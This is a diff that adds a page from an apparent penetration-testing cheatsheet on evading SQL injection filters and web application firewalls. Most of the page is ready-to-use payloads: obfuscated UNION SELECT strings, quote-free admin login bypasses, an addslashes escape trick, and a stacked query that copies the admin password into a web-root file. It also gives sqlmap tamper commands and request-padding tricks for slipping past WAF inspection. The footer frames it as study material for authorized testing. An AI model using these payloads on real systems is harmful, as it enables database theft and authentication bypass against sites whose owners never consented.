@@ -1,0 +1,355 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLi Filter &amp; WAF Bypasses · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>SQLi Filter &amp; WAF Bypasses</h1><p class="cx-lede">Evading input filters, blocklists, and web application firewalls.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1027</span><span class="cx-tag">D3FEND D3-MH, D3-MA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>When a payload is rejected, the application is filtering input or a WAF is sitting in front. The fix is rarely a single trick - chain multiple obfuscations until something gets through.</p>
+<h2 id="tldr">TL;DR</h2>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Case manipulation
+SeLeCt UnIoN
+
+-- Inline comments
+SEL/**/ECT  UN/**/ION
+SE%00LECT       (null byte)
+/*!50000SELECT*/   (MySQL versioned comment)
+
+-- Encoding
+%27         (URL-encoded &#x27;)
+%2527       (double URL-encoded)
+0x61646d696e   (hex literal for &quot;admin&quot;)
+CHAR(97,100,109,105,110)   (char codes for &quot;admin&quot;)
+
+-- Whitespace alternatives
+%09 (tab) %0A (LF) %0B (VT) %0C (FF) %0D (CR) %A0 (NBSP) %20 (space)
+/**/   (comment as separator)
++      (in URL context)
+
+-- Keyword alternatives
+&amp;&amp;   ||   instead of AND/OR
+=    LIKE
+!=   &lt;&gt;   NOT IN</code></pre></figure>
+<h2 id="strategy">Strategy</h2>
+<p>Filters and WAFs operate at different layers:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>What it does</th>
+<th>What bypasses it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Input validation (regex blocklist)</td>
+<td>Rejects strings matching patterns</td>
+<td>Encoding, case, comments, alt keywords</td>
+</tr>
+<tr>
+<td>WAF (signature-based)</td>
+<td>Pattern-matches known SQLi shapes</td>
+<td>Restructuring queries, encoding, fragmenting</td>
+</tr>
+<tr>
+<td>WAF (positive model)</td>
+<td>Only allows expected characters</td>
+<td>Hard to bypass; look for unprotected endpoints</td>
+</tr>
+<tr>
+<td>Type casting</td>
+<td>Forces input to int</td>
+<td>Find a string-typed parameter instead</td>
+</tr>
+<tr>
+<td>Parameterised queries</td>
+<td>Treats input as data</td>
+<td>Not bypassable; find another sink</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Always test which layer is rejecting the payload. Stripped chars vs. blocked request vs. modified response all need different bypasses.</p>
+</div>
+<h2 id="case-manipulation">Case manipulation</h2>
+<p>Most signature-based filters are case-insensitive, but some aren't (especially custom blocklists):</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT  →  SeLeCt   sElEcT   SELECt
+UNION   →  UnIoN    uNiOn
+WHERE   →  WhErE</code></pre></figure>
+<p>Test by sending the same payload in mixed case. If it works in mixed but not in lowercase, the filter is case-sensitive.</p>
+<h2 id="comments-as-obfuscation">Comments as obfuscation</h2>
+<p>Comments inside keywords break naive blocklists:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- MySQL inline comments
+UN/**/ION SE/**/LECT
+/**/UNION/**/SELECT/**/
+
+-- MySQL versioned comment (executed only in MySQL)
+/*!UNION*/ /*!SELECT*/
+/*!50000UNION*/ /*!50000SELECT*/    -- version-gated to MySQL &gt;= 5.0.0
+
+-- All DBMS line comment
+SELECT-- comment
+FROM users</code></pre></figure>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Versioned comments are MySQL-specific and frequently bypass WAFs that only check for <code>UNION SELECT</code> as a contiguous string.</p>
+</div>
+<h2 id="whitespace-alternatives">Whitespace alternatives</h2>
+<p>When spaces are stripped or trigger detection:</p>
+<table>
+<thead>
+<tr>
+<th>Substitute</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/**/</code></td>
+<td>Inline C-style comment, treated as whitespace</td>
+</tr>
+<tr>
+<td><code>+</code></td>
+<td>URL space encoding</td>
+</tr>
+<tr>
+<td><code>%09</code> (tab)</td>
+<td>Often unfiltered</td>
+</tr>
+<tr>
+<td><code>%0A</code> (LF), <code>%0D</code> (CR)</td>
+<td>Newlines</td>
+</tr>
+<tr>
+<td><code>%0B</code> (VT), <code>%0C</code> (FF)</td>
+<td>Less common, often unfiltered</td>
+</tr>
+<tr>
+<td><code>%A0</code> (NBSP)</td>
+<td>Non-breaking space</td>
+</tr>
+<tr>
+<td><code>()</code></td>
+<td>Wrap operands to remove space need</td>
+</tr>
+</tbody>
+</table>
+<p>Example without spaces:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;/**/UNION/**/SELECT/**/NULL,user(),NULL/**/FROM/**/dual-- -
+&#x27;UNION(SELECT(NULL),(user()),(NULL))-- -</code></pre></figure>
+<p>The second form uses parens instead of spaces entirely.</p>
+<h2 id="encoding">Encoding</h2>
+<p>URL encoding is the first try; double-encoding catches WAFs that decode once and then check:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27;  →  %27   →  %2527
+&quot;  →  %22   →  %2522
+=  →  %3D   →  %253D</code></pre></figure>
+<p>Other encodings:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- MySQL hex literal (for strings)
+WHERE username = 0x61646d696e            -- &quot;admin&quot;
+WHERE username = 0x61646D696E
+
+-- char-by-char
+WHERE username = CHAR(97,100,109,105,110)
+WHERE username = CONCAT(CHAR(97),CHAR(100))
+
+-- Unicode in some contexts
+%u0027   (some old IIS / .NET stacks)</code></pre></figure>
+<p>For strings, <code>0x...</code> (MySQL/MSSQL) and <code>CHR(N)</code> (Oracle, PostgreSQL) sidestep quote filtering entirely:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Original
+&#x27; OR username = &#x27;admin
+
+-- Without quotes
+&#x27; OR username = 0x61646d696e
+&#x27; OR username = CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))</code></pre></figure>
+<h2 id="keyword-alternatives">Keyword alternatives</h2>
+<p>When specific keywords are blocked:</p>
+<table>
+<thead>
+<tr>
+<th>Blocked</th>
+<th>Try instead</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>AND</code></td>
+<td><code>&amp;&amp;</code> (MySQL), <code>%26%26</code></td>
+</tr>
+<tr>
+<td><code>OR</code></td>
+<td><code>\|\|</code>, <code>%7C%7C</code> (PostgreSQL/Oracle/SQLite/MySQL with PIPES_AS_CONCAT off)</td>
+</tr>
+<tr>
+<td><code>=</code></td>
+<td><code>LIKE</code> (with no wildcards behaves like <code>=</code>), <code>&lt;=&gt;</code> (MySQL null-safe equal), <code>BETWEEN x AND x</code></td>
+</tr>
+<tr>
+<td><code>SUBSTRING</code></td>
+<td><code>MID()</code>, <code>SUBSTR()</code>, <code>LEFT()</code>, <code>RIGHT()</code></td>
+</tr>
+<tr>
+<td><code>CONCAT</code></td>
+<td><code>\|\|</code> concat, <code>+</code> concat (MSSQL), <code>CONCAT_WS</code></td>
+</tr>
+<tr>
+<td><code>SLEEP</code></td>
+<td><code>BENCHMARK(10000000, MD5(1))</code> (MySQL), heavy-query alternatives</td>
+</tr>
+<tr>
+<td><code>UNION SELECT</code></td>
+<td><code>UNION ALL SELECT</code>, versioned comment wrap</td>
+</tr>
+<tr>
+<td><code>information_schema</code></td>
+<td><code>mysql.innodb_table_stats</code> (MySQL), <code>pg_class</code> (PostgreSQL), <code>sys.tables</code> (MSSQL)</td>
+</tr>
+<tr>
+<td><code>database()</code></td>
+<td><code>schema()</code>, <code>@@database</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="logical-bypass-examples">Logical bypass examples</h2>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Original blocked
+1 OR 1=1
+1&#x27; OR &#x27;1&#x27;=&#x27;1
+
+-- Alternatives
+1 OR 2=2
+1 OR true
+1 OR 0x01=0x01
+1 OR &#x27;a&#x27; LIKE &#x27;a&#x27;
+1 OR 1 BETWEEN 0 AND 2
+1 || 1=1
+1 %7C%7C 1=1</code></pre></figure>
+<h2 id="bypassing-length-limits">Bypassing length limits</h2>
+<p>Some inputs are truncated to N characters. Restructure to fit:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Long form (50+ chars)
+&#x27; UNION SELECT username,password FROM users WHERE id=1-- -
+
+-- Compact form
+&#x27; UNION SELECT * FROM users-- -
+&#x27;OR/**/1-- -</code></pre></figure>
+<p>Or use stacked queries to set up state first:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; SET @x=(SELECT password FROM users WHERE username=&#x27;admin&#x27;)-- -
+-- (next request)
+&#x27;; SELECT @x INTO OUTFILE &#x27;/var/www/html/p.txt&#x27;-- -</code></pre></figure>
+<h2 id="bypassing-quote-filters">Bypassing quote filters</h2>
+<p>When <code>'</code> and <code>"</code> are stripped or escaped:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Hex literal - no quotes needed
+&#x27; OR username=0x61646d696e
+
+-- char codes
+&#x27; OR username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
+
+-- Numeric injection (when the parameter is unquoted)
+1 OR id=(SELECT id FROM users WHERE username=0x61646d696e)</code></pre></figure>
+<p>If the application escapes <code>'</code> to <code>\'</code>, try a backslash to escape the escape:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Original input becomes: WHERE x=&#x27;\&#x27;&#x27;
+-- Better: append your own backslash
+\&#x27; OR 1=1-- -
+-- App sees \&#x27; (escaped backslash) followed by &#x27;, which terminates the string</code></pre></figure>
+<p>This works against naive <code>addslashes()</code> implementations on multi-byte charsets.</p>
+<h2 id="sqlmap-tamper-scripts">sqlmap tamper scripts</h2>
+<p><code>sqlmap</code> ships with tamper scripts that automate common bypasses:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sqlmap -u &quot;https://&lt;TARGET&gt;/page?id=1&quot; --tamper=between,randomcase,space2comment</code></pre></figure>
+<p>Useful tamper scripts:</p>
+<table>
+<thead>
+<tr>
+<th>Script</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>space2comment</code></td>
+<td>Replaces spaces with <code>/**/</code></td>
+</tr>
+<tr>
+<td><code>space2plus</code></td>
+<td>Replaces spaces with <code>+</code></td>
+</tr>
+<tr>
+<td><code>space2randomblank</code></td>
+<td>Random whitespace chars</td>
+</tr>
+<tr>
+<td><code>randomcase</code></td>
+<td>Randomises keyword case</td>
+</tr>
+<tr>
+<td><code>between</code></td>
+<td>Replaces <code>&gt;</code> with <code>NOT BETWEEN 0 AND</code></td>
+</tr>
+<tr>
+<td><code>charencode</code></td>
+<td>URL-encodes all chars</td>
+</tr>
+<tr>
+<td><code>charunicodeencode</code></td>
+<td>Unicode-encodes</td>
+</tr>
+<tr>
+<td><code>apostrophenullencode</code></td>
+<td><code>'</code> → <code>%00%27</code></td>
+</tr>
+<tr>
+<td><code>equaltolike</code></td>
+<td>Replaces <code>=</code> with <code>LIKE</code></td>
+</tr>
+<tr>
+<td><code>versionedmorekeywords</code></td>
+<td>Wraps keywords in <code>/*!50000...*/</code></td>
+</tr>
+<tr>
+<td><code>modsecurityversioned</code></td>
+<td>ModSecurity-targeted versioned comment</td>
+</tr>
+</tbody>
+</table>
+<p>List all: <code>sqlmap --list-tampers</code>. Combine multiple with commas.</p>
+<h2 id="detecting-which-layer-is-filtering">Detecting which layer is filtering</h2>
+<p>Send a deliberately malformed payload and observe:</p>
+<table>
+<thead>
+<tr>
+<th>Response</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Application error page</td>
+<td>App-level rejection (custom validation)</td>
+</tr>
+<tr>
+<td>Generic "Forbidden" / "Bad Request" / 403</td>
+<td>WAF rejection</td>
+</tr>
+<tr>
+<td>HTTP 200 with normal page (no injection)</td>
+<td>Input silently stripped</td>
+</tr>
+<tr>
+<td>HTTP 200 with sanitised input echoed back</td>
+<td>Input modified by the app</td>
+</tr>
+<tr>
+<td>Connection reset</td>
+<td>Aggressive WAF or IPS</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>WAF blocks usually have distinctive behaviour: a generic error page, a unique HTTP status, or a "request was blocked" string. Once you identify which WAF (Cloudflare, Akamai, AWS WAF, ModSecurity, Imperva), search for known bypass techniques specific to that product.</p>
+</div>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>Bypass discovery is often more art than science. Stack obfuscations: case + comments + encoding + alternate keywords often beats filters that block any single technique.</li>
+<li>If you can't bypass the WAF, look for unprotected endpoints - internal APIs, admin panels, second-order injection points where the storage path is filtered but the trigger path is not.</li>
+<li>Some WAFs only inspect the first N bytes of a request. Padding the payload with thousands of safe characters before the injection occasionally bypasses byte-limited inspection.</li>
+<li>Time spent bypassing a strong WAF is sometimes better spent looking for a different vulnerability class. WAFs rarely cover everything; an XSS or SSRF on the same target is often easier to find than an SQLi bypass.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../file-operations/index.html">Previous: SQLi File Operations</a><a class="cx-next" href="../dbms-cheatsheet/index.html">Next: DBMS Syntax Cheatsheet</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
